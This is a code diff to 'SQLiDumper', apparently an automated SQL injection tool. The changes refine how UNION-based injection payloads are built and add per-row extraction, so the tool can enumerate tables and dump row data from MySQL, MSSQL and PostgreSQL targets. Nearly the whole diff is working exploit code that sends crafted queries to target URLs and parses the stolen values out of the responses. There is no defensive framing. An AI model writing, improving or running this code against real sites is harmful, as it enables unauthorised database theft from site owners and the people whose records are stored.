@@ -276,19 +276,29 @@ class SQLiDumper:
         falls back to heuristic detection for backward compatibility.
         
         Returns:
-            (prefix, suffix) tuple ready for UNION injection.
+            (prefix, suffix, is_replace) tuple ready for UNION injection.
             prefix includes 'AND 1=2' to suppress original rows.
+            is_replace: if True, the prefix REPLACES the original param value
+                        (numeric styles like -1, 999999.9); if False, it's
+                        appended after the original value.
         """
-        suffix = getattr(sqli, 'suffix', '-- -') or '-- -'
+        # Suffix: only default to '-- -' if scanner didn't set it at all
+        # Ensure suffix always has a leading space for safe SQL comment
+        suffix = getattr(sqli, 'suffix', None)
+        if suffix is None:
+            suffix = ' -- -'
+        elif suffix and not suffix.startswith(' '):
+            suffix = f' {suffix}'
+        
         scanner_prefix = getattr(sqli, 'prefix', None)
         
         if scanner_prefix:
-            # Use scanner-detected prefix directly
+            # Scanner-detected prefix: numeric replaces, string appends
             is_numeric_style = scanner_prefix in ("-1", "999999.9") or scanner_prefix.endswith(")")
             if is_numeric_style:
-                return (f"{scanner_prefix} AND 1=2 ", suffix)
+                return (f"{scanner_prefix} AND 1=2 ", suffix, True)
             else:
-                return (f"{scanner_prefix} AND 1=2 ", suffix)
+                return (f"{scanner_prefix} AND 1=2 ", suffix, False)
         
         # Legacy fallback: infer from original param value / payload_used
         prefix = "' AND 1=2 "
@@ -299,7 +309,24 @@ class SQLiDumper:
             if not p.startswith("'") and not p.startswith('"'):
                 prefix = " AND 1=2 "
         
-        return (prefix, suffix)
+        return (prefix, suffix, False)
+
+    def _inject_value(self, original: str, query: str, is_replace: bool) -> str:
+        """Build the parameter value for injection.
+        
+        If is_replace, the query already includes a prefix that replaces
+        the original value (numeric styles like -1). Otherwise, append
+        the injection after the original value.
+        """
+        if is_replace:
+            return query
+        return f"{original}{query}"
+
+    def _suffix_str(self, suffix: str) -> str:
+        """Ensure suffix has a leading space for safe SQL comment."""
+        if suffix and not suffix.startswith(" "):
+            return f" {suffix}"
+        return suffix
 
     async def enumerate_tables(self, sqli: SQLiResult, 
                                session: aiohttp.ClientSession) -> List[str]:
@@ -321,7 +348,7 @@ class SQLiDumper:
         original = params[param][0] if isinstance(params[param], list) else params[param]
         
         # Determine injection prefix/suffix using scanner-detected values
-        prefix, suffix = self._determine_prefix_suffix(sqli, original)
+        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
         
         if sqli.injection_type == "union" and sqli.injectable_columns:
             null_list = ["NULL"] * sqli.column_count
@@ -351,7 +378,7 @@ class SQLiDumper:
                         )
                         
                         test_params = params.copy()
-                        test_params[param] = [f"{original}{query}"]
+                        test_params[param] = [self._inject_value(original, query, is_replace)]
                         test_url = scanner._build_url(base, test_params)
                     
                         body, _ = await scanner._fetch(test_url, session)
@@ -377,7 +404,7 @@ class SQLiDumper:
                         f"FROM sysobjects WHERE xtype='U'{suffix}"
                     )
                     test_params = params.copy()
-                    test_params[param] = [f"{original}{query}"]
+                    test_params[param] = [self._inject_value(original, query, is_replace)]
                     test_url = scanner._build_url(base, test_params)
                     
                     body, _ = await scanner._fetch(test_url, session)
@@ -397,7 +424,7 @@ class SQLiDumper:
                         f"FROM pg_tables WHERE schemaname='public'{suffix}"
                     )
                     test_params = params.copy()
-                    test_params[param] = [f"{original}{query}"]
+                    test_params[param] = [self._inject_value(original, query, is_replace)]
                     test_url = scanner._build_url(base, test_params)
                     
                     body, _ = await scanner._fetch(test_url, session)
@@ -410,6 +437,41 @@ class SQLiDumper:
         
         # Deduplicate
         tables = list(dict.fromkeys(tables))
+        
+        # Fallback: if GROUP_CONCAT returned 0 tables, try per-row extraction
+        if not tables and sqli.injection_type == "union" and sqli.injectable_columns:
+            if sqli.dbms in ("mysql", ""):
+                marker_s = f"mts{random.randint(10000, 99999)}"
+                marker_e = f"mte{random.randint(10000, 99999)}"
+                ms_hex = marker_s.encode().hex()
+                me_hex = marker_e.encode().hex()
+                
+                for col_idx in sqli.injectable_columns[:2]:
+                    null_list_copy = ["NULL"] * sqli.column_count
+                    null_list_copy[col_idx] = f"CONCAT(0x{ms_hex},table_name,0x{me_hex})"
+                    
+                    query = (
+                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
+                        f"FROM information_schema.tables "
+                        f"WHERE table_schema=database(){suffix}"
+                    )
+                    test_params = params.copy()
+                    test_params[param] = [self._inject_value(original, query, is_replace)]
+                    test_url = scanner._build_url(base, test_params)
+                    
+                    body, _ = await scanner._fetch(test_url, session)
+                    if body:
+                        for m in re.finditer(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body):
+                            tname = m.group(1).strip()
+                            if tname and tname.lower() not in ("null",):
+                                tables.append(tname)
+                    if tables:
+                        break
+                
+                tables = list(dict.fromkeys(tables))
+                if tables:
+                    logger.info(f"Fallback enumerated {len(tables)} tables from {base_url}")
+        
         logger.info(f"Enumerated {len(tables)} tables from {base_url}")
         return tables
 
@@ -431,7 +493,7 @@ class SQLiDumper:
         original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
         
         # Determine injection prefix/suffix using scanner-detected values
-        prefix, suffix = self._determine_prefix_suffix(sqli, original)
+        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
         
         if sqli.injection_type == "union" and sqli.injectable_columns:
             null_list = ["NULL"] * sqli.column_count
@@ -457,7 +519,7 @@ class SQLiDumper:
                     )
                     
                     test_params = params.copy()
-                    test_params[sqli.parameter] = [f"{original}{query}"]
+                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
                     test_url = scanner._build_url(base, test_params)
                     
                     body, _ = await scanner._fetch(test_url, session)
@@ -478,7 +540,7 @@ class SQLiDumper:
                         f"WHERE table_name='{table}'{suffix}"
                     )
                     test_params = params.copy()
-                    test_params[sqli.parameter] = [f"{original}{query}"]
+                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
                     test_url = scanner._build_url(base, test_params)
                     
                     body, _ = await scanner._fetch(test_url, session)
@@ -499,7 +561,7 @@ class SQLiDumper:
                         f"WHERE table_name='{table}'{suffix}"
                     )
                     test_params = params.copy()
-                    test_params[sqli.parameter] = [f"{original}{query}"]
+                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
                     test_url = scanner._build_url(base, test_params)
                     
                     body, _ = await scanner._fetch(test_url, session)
@@ -542,7 +604,7 @@ class SQLiDumper:
         null_list = ["NULL"] * sqli.column_count
         
         # Determine injection prefix/suffix using scanner-detected values
-        prefix, suffix = self._determine_prefix_suffix(sqli, original)
+        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
         
         # Build CONCAT expression for all target columns
         separator = "0x7c7c"  # ||
@@ -556,23 +618,25 @@ class SQLiDumper:
         if sqli.dbms in ("mysql", ""):
             concat_cols = ",".join([f"IFNULL({c},'NULL')" for c in columns])
             
+            # Per-row extraction avoids MySQL group_concat_max_len (default 1024)
+            # which silently truncates long column values
             for col_idx in sqli.injectable_columns:
                 found_any = False
-                for offset in range(0, limit, 20):
+                for row_idx in range(limit):
                     null_list_copy = null_list.copy()
                     null_list_copy[col_idx] = (
                         f"CONCAT(0x{marker_start_hex},"
-                        f"GROUP_CONCAT(CONCAT_WS({separator},{concat_cols}) SEPARATOR {row_separator}),"
+                        f"CONCAT_WS({separator},{concat_cols}),"
                         f"0x{marker_end_hex})"
                     )
                 
                     query = (
                         f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
-                        f"FROM {table} LIMIT {offset},20{suffix}"
+                        f"FROM {table} LIMIT {row_idx},1{suffix}"
                     )
                     
                     test_params = params.copy()
-                    test_params[sqli.parameter] = [f"{original}{query}"]
+                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
                     test_url = scanner._build_url(base, test_params)
                     
                     body, _ = await scanner._fetch(test_url, session)
@@ -581,22 +645,24 @@ class SQLiDumper:
                     
                     match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body, re.S)
                     if not match:
-                        break
+                        # Try once more before giving up (may need different col)
+                        if row_idx == 0:
+                            break  # first row failed, try next injectable col
+                        break  # no more rows
                     
                     found_any = True
-                    raw_rows = match.group(1).split("<br>")
-                    batch_count = 0
-                    for raw_row in raw_rows:
-                        if not raw_row.strip():
-                            continue
-                        values = raw_row.split("||")
-                        if len(values) == len(columns):
-                            row = {columns[i]: values[i] for i in range(len(columns))}
-                            rows.append(row)
-                            batch_count += 1
+                    raw = match.group(1).strip()
+                    if not raw:
+                        break
+                    values = raw.split("||")
+                    if len(values) == len(columns):
+                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
+                        rows.append(row)
+                    elif len(values) > len(columns):
+                        # Column values contain || themselves — take first N
+                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
+                        rows.append(row)
                     
-                    if batch_count < 20:
-                        break  # No more rows
                 if found_any:
                     break  # Found rows with this column, stop trying others
         
@@ -613,7 +679,7 @@ class SQLiDumper:
                 
                 query = f"{prefix}UNION ALL SELECT {','.join(null_list_copy)}{suffix}"
                 test_params = params.copy()
-                test_params[sqli.parameter] = [f"{original}{query}"]
+                test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
                 test_url = scanner._build_url(base, test_params)
                 
                 body, _ = await scanner._fetch(test_url, session)
@@ -652,7 +718,7 @@ class SQLiDumper:
         null_list = ["NULL"] * sqli.column_count
         
         # Determine injection prefix/suffix using scanner-detected values
-        prefix, suffix = self._determine_prefix_suffix(sqli, original)
+        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
         
         dios_query = self.DIOS_QUERIES.get(sqli.dbms or "mysql")
         if not dios_query:
@@ -669,7 +735,7 @@ class SQLiDumper:
             
             query = f"{prefix}UNION ALL SELECT {','.join(null_list_copy)}{suffix}"
             test_params = params.copy()
-            test_params[sqli.parameter] = [f"{original}{query}"]
+            test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
             test_url = scanner._build_url(base, test_params)
             
             body, _ = await scanner._fetch(test_url, session)
